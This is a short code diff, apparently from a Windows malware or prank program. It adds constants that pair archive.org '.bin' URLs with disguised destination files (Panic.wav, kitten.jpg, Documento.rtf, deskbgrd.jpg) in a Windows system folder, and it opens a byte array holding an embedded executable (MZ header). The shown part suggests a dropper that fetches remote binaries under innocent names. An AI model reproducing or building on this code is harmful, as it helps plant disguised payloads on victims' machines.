@@ -42,6 +42,7 @@ const size_t escape_len = sizeof(escapem);
 
 /* links to download files */
 
+/* new version urls 
 const wchar_t* srcURL = L"http://archive.org/download/01101000/0000003.bin"; // Music Download
 const wchar_t* destFile = L"C:\\Program Files\\Common Files\\system\\Panic.wav";
 
@@ -53,6 +54,22 @@ const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\paint.rtf"
 
 const wchar_t* srcURL1 = L"http://archive.org/download/01101000/00000011.bin"; 
 const wchar_t* destFile1 = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
+*/
+
+/* original version urls */
+
+const wchar_t* srcURL = L"http://archive.org/download/01101000/0000003.bin"; // Music Download
+const wchar_t* destFile = L"C:\\Program Files\\Common Files\\system\\Panic.wav";
+
+const wchar_t* srcURLk = L"http://archive.org/download/01101000/0000005.bin"; // Downloads aww kittens picture
+const wchar_t* destFilek = L"C:\\Program Files\\Common Files\\system\\kitten.jpg";
+
+const wchar_t* srcURL8 = L"http://archive.org/download/01101000/0000002.bin";
+const wchar_t* destFile8 = L"C:\\Program Files\\Common Files\\system\\Documento.rtf";
+
+const wchar_t* srcURL1 = L"http://archive.org/download/01101000/0000001.bin";
+const wchar_t* destFile1 = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
+
 
 const unsigned char tdp[] = {
     0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
